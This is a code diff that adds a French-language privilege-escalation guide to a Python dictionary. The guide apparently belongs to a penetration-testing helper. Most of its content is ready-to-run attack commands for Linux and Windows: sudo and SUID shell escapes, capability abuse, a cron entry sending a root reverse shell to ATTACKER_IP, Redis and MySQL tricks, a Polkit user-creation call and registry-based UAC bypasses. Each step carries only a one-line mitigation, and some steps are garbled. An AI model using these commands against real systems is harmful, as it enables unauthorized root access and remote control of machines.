@@ -868,6 +868,420 @@ GUIDES = {
                 "mitigation": "Restreindre l'accès metadata, utiliser managed identities, rotation de credentials"
             }
         }
+    },
+    "privesc": {
+        "name": "Privilege Escalation",
+        "description": "Méthodologie complète pour l'élévation de privilèges",
+        "vulnerabilities": {
+            "linux_privesc": {
+                "name": "Linux Privilege Escalation",
+                "severity": "Critical",
+                "description": "Méthodologie complète pour obtenir root sur Linux",
+                "steps": [
+                    {
+                        "title": "Vérifications initiales",
+                        "description": "Informations système et utilisateur",
+                        "command": "id; whoami; uname -a; cat /etc/os-release",
+                        "expected_output": "Informations sur l'utilisateur, kernel, distribution"
+                    },
+                    {
+                        "title": "Enumération des privilèges sudo",
+                        "description": "Liste des commandes sudo autorisées",
+                        "command": "sudo -l",
+                        "expected_output": "Commandes sudo sans mot de passe listées"
+                    },
+                    {
+                        "title": "Vérification SUID/SGID",
+                        "description": "Recherche binaires SUID/SGID",
+                        "command": "find / -perm -4000 -type f 2>/dev/null; find / -perm -2000 -type f 2>/dev/null",
+                        "expected_output": "Liste des binaires SETUID/SETGID"
+                    },
+                    {
+                        "title": "Capabilities Linux",
+                        "description": "Vérifier les capabilities privilégiées",
+                        "command": "getcap -r / 2>/dev/null",
+                        "expected_output": "Capabilities élevées trouvées"
+                    },
+                    {
+                        "title": "Crontab et processus temps réel",
+                        "description": "Recherche tâches cron accessibles",
+                        "command": "cat /etc/crontab; ls -la /etc/cron.* 2>/dev/null; crontab -l",
+                        "expected_output": "Tâches planifiées avec permissions d'écriture"
+                    },
+                    {
+                        "title": "Vérification PATH",
+                        "description": "PATH manipulable?",
+                        "command": "echo $PATH",
+                        "expected_output": "Chemin avec dossiers accessibles en écriture"
+                    },
+                    {
+                        "title": "Historique bash/zsh",
+                        "description": "Recherche mots de passe en clair",
+                        "command": "cat ~/.bash_history; cat ~/.zsh_history",
+                        "expected_output": "Mots de passe, secrets exposés"
+                    },
+                    {
+                        "title": "Fichiers de configuration sensibles",
+                        "description": "Fichiers avec credentials potentiels",
+                        "command": "find /home -name '*.txt' -o -name '*.conf' -o -name '*.config' 2>/dev/null | head -20",
+                        "expected_output": "Fichiers avec credentials potentiels"
+                    }
+                ],
+                "mitigation": "Principe du moindre privilège, audit régulier SUID/SGID, rotaton des mots de passe, séparation des comptes"
+            },
+            "linux_sudo_exploit": {
+                "name": "Exploitation SUDO",
+                "severity": "Critical",
+                "description": "Exploiter des privilèges sudo mal configurés",
+                "steps": [
+                    {
+                        "title": "Enumérer SUDO",
+                        "description": "Lister les commandes sudo autorisées",
+                        "command": "sudo -l",
+                        "expected_output": "Commandes NOPASSWD affichées"
+                    },
+                    {
+                        "title": "Exploitation FIND",
+                        "description": "Si find est autorisé sans mot de passe",
+                        "command": "sudo find /etc/passwd -exec /bin/bash \\;",
+                        "expected_output": "Shell root obtenu"
+                    },
+                    {
+                        "title": "Exploitation VIM/VI",
+                        "description": "Si vim/vi est autorisé",
+                        "command": "sudo vim -c ':!/bin/bash'",
+                        "expected_output": "Shell root via vim"
+                    },
+                    {
+                        "title": "Exploitation Nmap",
+                        "description": "Si nmap est autorisé (mode inter actif)",
+                        "command": "echo 'os.execute(\"/bin/bash\")' | sudo nmap --script",
+                        "expected_output": "Shell root via Lua nmap"
+                    },
+                    {
+                        "title": "Exploitation Git",
+                        "description": "Si git est autorisé",
+                        "command": "sudo PAGER='sh -c \"exec sh <&1\"' git -p help",
+                        "expected_output": "Shell root via git pager"
+                    },
+                    {
+                        "title": "Exploitation Python",
+                        "description": "Si python est autorisé",
+                        "command": "sudo python -c 'import os; os.system(\"/bin/bash\")'",
+                        "expected_output": "Shell root via Python"
+                    },
+                    {
+                        "title": "Exploitation LESS/MORE",
+                        "description": "Si less/more est autorisé",
+                        "command": "sudo less /etc/passwd puis tape 'v' puis ':!/bin/bash'",
+                        "expected_output": "Shell root via éditeur less"
+                    }
+                ],
+                "mitigation": "Minimiser les privilèges sudo, éviter NOPASSWD, whitelist stricte des commandes, logging sudo"
+            },
+            "linux_suid_exploit": {
+                "name": "Exploitation SUID/SGID",
+                "severity": "Critical",
+                "description": "Exploiter des binaires SUID mal configurés",
+                "steps": [
+                    {
+                        "title": "Recherche SUID",
+                        "description": "Enumérer tous les binaires SUID",
+                        "command": "find / -perm -4000 -type f 2>/dev/null",
+                        "expected_output": "Liste des binaires SUID"
+                    },
+                    {
+                        "title": "Vérifier GTFOBins",
+                        "description": "Consulter GTFOBins pour exploits connus",
+                        "command": "curl -s https://gtfobins.github.io | grep <binary_name>",
+                        "expected_output": "Techniques d'exploitation SUID documentées"
+                    },
+                    {
+                        "title": "Exploitation FIND",
+                        "description": "Si find est SUID",
+                        "command": "find . -exec /bin/bash -p \\;",
+                        "expected_output": "Shell root via find"
+                    },
+                    {
+                        "title": "Exploitation NANO",
+                        "description": "Si nano est SUID",
+                        "command": "nano puis Ctrl+R puis Ctrl+X puis /bin/bash",
+                        "expected_output": "Shell root via nano"
+                    },
+                    {
+                        "title": "Exploitation VIM",
+                        "description": "Si vim est SUID",
+                        "command": "vim +':py3 import os; os.execl(\"/bin/bash\", \"bash\", \"-pc\", \"/bin/bash\")'",
+                        "expected_output": "Shell root via vim"
+                    },
+                    {
+                        "title": "Exploitation LESS",
+                        "description": "Si less est SUID",
+                        "command": "less /etc/passwd puis tape 'v' pour éditeur, puis ':!/bin/bash'",
+                        "expected_output": "Shell root via less"
+                    },
+                    {
+                        "title": "Exploitation PASSWD",
+                        "description": "Si passwd est SUID et vulnérable",
+                        "command": "passwd puis test avec ancien mot de passe",
+                        "expected_output": "Accès root via changement mot de passe"
+                    }
+                ],
+                "mitigation": "Minimiser les binaires SUID, utiliser capabilities au lieu de SUID, audit régulier, whitelist stricte"
+            },
+            "linux_capabilities": {
+                "name": "Exploitation Linux Capabilities",
+                "severity": "High",
+                "description": "Exploiter les capabilities élevées",
+                "steps": [
+                    {
+                        "title": "Recherche capabilities",
+                        "description": "Enumérer les capabilities",
+                        "command": "getcap -r / 2>/dev/null",
+                        "expected_output": "Capabilities privilégiées listées"
+                    },
+                    {
+                        "title": "Exploitation CAP_DAC_READ_SEARCH",
+                        "description": "Bypass permissions de lecture",
+                        "command": "getcap -r / 2>/dev/null | grep 'cap_dac_read_search+ep'",
+                        "expected_output": "Binaires avec lecture bypass"
+                    },
+                    {
+                        "title": "Exploitation CAP_DAC_OVERRIDE",
+                        "description": "Bypass permissions d'écriture",
+                        "command": "getcap -r / 2>/dev/null | grep 'cap_dac_override+ep'",
+                        "expected_output": "Binaires avec écriture bypass"
+                    },
+                    {
+                        "title": "Exploitation python avec CAP_SETUID",
+                        "description": "Python capable de changer UID",
+                        "command": "python -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
+                        "expected_output": "Shell root via capabilities Python"
+                    },
+                    {
+                        "title": "Exploitation tcpdump",
+                        "description": "Si tcpdump a cap_sys_admin",
+                        "command": "tcpdump -n -i lo -G 1 -W 1 -w /dev/null -z /bin/bash",
+                        "expected_output": "Shell root via tcpdump"
+                    }
+                ],
+                "mitigation": "Minimiser les capabilities, principe du moindre privilège, monitorer les capabilities"
+            },
+            "linux_cron_exploit": {
+                "name": "Exploitation Tâches Cron",
+                "severity": "High",
+                "description": "Exploiter des crontabs mal sécurisés",
+                "steps": [
+                    {
+                        "title": "Enumération crontab",
+                        "description": "Rechercher tous les crontabs",
+                        "command": "cat /etc/crontab; ls -la /etc/cron.* 2>/dev/null; ls -la /var/spool/cron/crontabs/ 2>/dev/null",
+                        "expected_output": "Tâches cron trouvées"
+                    },
+                    {
+                        "title": "Vérifier permissions",
+                        "description": "Trouver crontabs modifiables",
+                        "command": "find /etc/cron* -writable 2>/dev/null",
+                        "expected_output": "Fichiers cron accessibles en écriture"
+                    },
+                    {
+                        "title": "Exploitation cron racine",
+                        "description": "Script exécuté par root",
+                        "command": "echo '* * * * * root /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /etc/crontab",
+                        "expected_output": "Reverse shell root en 1 minute"
+                    },
+                    {
+                        "title": "Wildcard injection",
+                        "description": "Si des wildcards sont utilisés dans cron",
+                        "command": "touch '/var/spool/cron/malicious' et configurer cron pour exécuter *",
+                        "expected_output": "Commande arbitraire exécutée"
+                    },
+                    {
+                        "title": "PATH manipulation",
+                        "description": "Si PATH utilisé dans cron",
+                        "command": "Vérifier PATH et créer binaire malicieux avec nom de commande",
+                        "expected_output": "Commande malveillante exécutée à la place"
+                    }
+                ],
+                "mitigation": "Permissions strictes sur /etc/crontab, éviter wildcards, PATH absolu, monitoring des crontabs"
+            },
+            "linux_kernel_exploit": {
+                "name": "Exploitation Kernel",
+                "severity": "Critical",
+                "description": "Exploiter des vulnérabilités kernel pour privesc",
+                "steps": [
+                    {
+                        "title": "Identifier kernel version",
+                        "description": "Version exacte du kernel",
+                        "command": "uname -a",
+                        "expected_output": "Version kernel: 5.x.x ou 4.x.x"
+                    },
+                    {
+                        "title": "Chercher exploits",
+                        "description": "Rechercher exploit publics",
+                        "command": "searchsploit kernel 5.x ou Google: 'kernel 5.x exploit CVE'",
+                        "expected_output": "Exploits publics trouvés"
+                    },
+                    {
+                        "title": "Dirty Cow",
+                        "description": "Si kernel < 4.8.3",
+                        "command": "gcc -pthread dirty.c -o dirty -lcrypt; ./dirty",
+                        "expected_output": "Root via Dirty Cow exploit"
+                    },
+                    {
+                        "title": "Dirty Pipe",
+                        "description": "Si kernel >= 5.8 < 5.16.11",
+                        "command": "gcc dirtypipe.c -o dirtypipe; ./dirtypipe /etc/passwd",
+                        "expected_output": "Root via Dirty Pipe"
+                    },
+                    {
+                        "title": "PwnKit",
+                        "description": "pkexec vulnerable (CVE-2021-4034)",
+                        "command": "wget exploit; make; ./pwnkit",
+                        "expected_output": "Root shell instantané"
+                    },
+                    {
+                        "title": "Polkit CVE-2021-3560",
+                        "description": "Polkit authentication bypass",
+                        "command": "dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:hacker string:'Hacker User' int32:1",
+                        "expected_output": "Nouvel utilisateur admin créé"
+                    }
+                ],
+                "mitigation": "Mise à jour kernel régulière, patch management, reboot après updates, kernel hardening"
+            },
+            "linux_network_exploit": {
+                "name": "Exploitation Configuration Réseau",
+                "severity": "High",
+                "description": "Exploiter des configurations réseau faibles",
+                "steps": [
+                    {
+                        "title": "Partages NFS",
+                        "description": "Vérifier NFS montés",
+                        "command": "mount | grep nfs; cat /etc/fstab | grep nfs",
+                        "expected_output": "Partages NFS trouvés"
+                    },
+                    {
+                        "title": "Exploitation NFS no_root_squash",
+                        "description": "Si no_root_squash activé",
+                        "command": "Créer un SUID sur le partage NFS et l'exécuter localement",
+                        "expected_output": "Privilege escalation via NFS"
+                    },
+                    {
+                        "title": "Services en écoute",
+                        "description": "Services réseau locaux",
+                        "command": "netstat -tulpn; ss -tulpn",
+                        "expected_output": "Services MySQL, Redis, MongoDB, etc."
+                    },
+                    {
+                        "title": "Exploitation MySQL",
+                        "description": "Si MySQL root sans mot de passe",
+                        "command": "mysql -u root && SELECT sys_exec('chmod +s /bin/bash');",
+                        "expected_output": "SUID bash créé"
+                    },
+                    {
+                        "title": "Exploitation Redis",
+                        "description": "Redis exposé localement",
+                        "command": "redis-cli flushall; redis-cli set payload 'chmod +s /bin/bash'; config set dir /etc/; config set dbfilename crontab; save",
+                        "expected_output": "Commande root via Redis"
+                    }
+                ],
+                "mitigation": "Sécuriser NFS, désactiver root access, pare-feu local, services en localhost only"
+            },
+            "windows_privesc": {
+                "name": "Windows Privilege Escalation",
+                "severity": "Critical",
+                "description": "Méthodologie complète pour obtenir SYSTEM sur Windows",
+                "steps": [
+                    {
+                        "title": "Vérifications initiales",
+                        "description": "Informations système et utilisateur",
+                        "command": "whoami; whoami /priv; systeminfo; hostname",
+                        "expected_output": "Infos utilisateur, privilèges, OS version"
+                    },
+                    {
+                        "title": "Enumération privilèges",
+                        "description": "Privilèges et groupes utilisateur",
+                        "command": "whoami /priv; whoami /groups; net user %USERNAME%",
+                        "expected_output": "SeBackupPrivilege, SeDebugPrivilege, etc."
+                    },
+                    {
+                        "title": "Vérification groupes locaux",
+                        "description": "Membres des groupes privilégiés",
+                        "command": "net localgroup administrators; net localgroup 'Remote Desktop Users'",
+                        "expected_output": "Liste des administrateurs et RDP users"
+                    },
+                    {
+                        "title": "Enumération services",
+                        "description": "Services mal configurés",
+                        "command": "wmic service get name,pathname,displayname,startmode | findstr /i auto",
+                        "expected_output": "Services auto-start avec chemins accessibles"
+                    },
+                    {
+                        "title": "Vérification UAC",
+                        "description": "Niveau UAC configuré",
+                        "command": "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA",
+                        "expected_output": "EnableLUA = 1 (UAC activé)"
+                    },
+                    {
+                        "title": "Unquoted service paths",
+                        "description": "Chemins service sans guillemets",
+                        "command": "wmic service get name,pathname,displayname,startmode | findstr /i /v 'C:\\Windows' | findstr /i auto",
+                        "expected_output": "Services avec chemins sans guillemets"
+                    },
+                    {
+                        "title": "Vérification permissions fichiers",
+                        "description": "Fichiers system accessibles en écriture",
+                        "command": "icacls C:\\Windows\\System32\\taskkill.exe",
+                        "expected_output": "Permissions d'écriture détectées"
+                    },
+                    {
+                        "title": "Historique PowerShell",
+                        "description": "Recherche credentials exposés",
+                        "command": "type C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt",
+                        "expected_output": "Mots de passe, secrets en clair"
+                    }
+                ],
+                "mitigation": "Principe du moindre privilège, contrôle UAC strict, audit services, monitoring"
+            },
+            "windows_uac_bypass": {
+                "name": "Bypass UAC",
+                "severity": "High",
+                "description": "Contourner User Account Control Windows",
+                "steps": [
+                    {
+                        "title": "Vérifier version Windows",
+                        "description": "Version exacte pour choisir exploit",
+                        "command": "systeminfo | findstr /B /C:'OS Name' /C:'OS Version'",
+                        "expected_output": "Windows 10/11 version exacte"
+                    },
+                    {
+                        "title": "UACMe",
+                        "description": "Framework de bypass UAC",
+                        "command": "UACMe.exe 33 ou UACMe.exe 64",
+                        "expected_output": "Shell elevée obtenue"
+                    },
+                    {
+                        "title": "Fodhelper bypass",
+                        "description": "Exploit fodhelper.exe",
+                        "command": "reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /d 'C:\\Windows\\System32\\cmd.exe' /f",
+                        "expected_output": "Commande exécutée en elevée"
+                    },
+                    {
+                        "title": "Event Viewer bypass",
+                        "description": "Bypass via eventvwr",
+                        "command": "Reg add \"HKCU\\Software\\Classes\\mscfile\\shell\\open\\command\" /t REG_SZ /d \"C:\\Windows\\System32\\cmd.exe\" /f",
+                        "expected_output": "Cmd elevée via eventvwr"
+                    },
+                    {
+                        "title": "DLL hijacking",
+                        "description": "Si SeImpersonatePrivilege",
+                        "command": "getsystem via Metasploit ou PrintSpoofer.exe",
+                        "expected_output": "SYSTEM shell"
+                    }
+                ],
+                "mitigation": "UAC au niveau maximum, patchs Windows à jour, whitelist applications, monitoring"
+            }
+        }
     }
 }
 
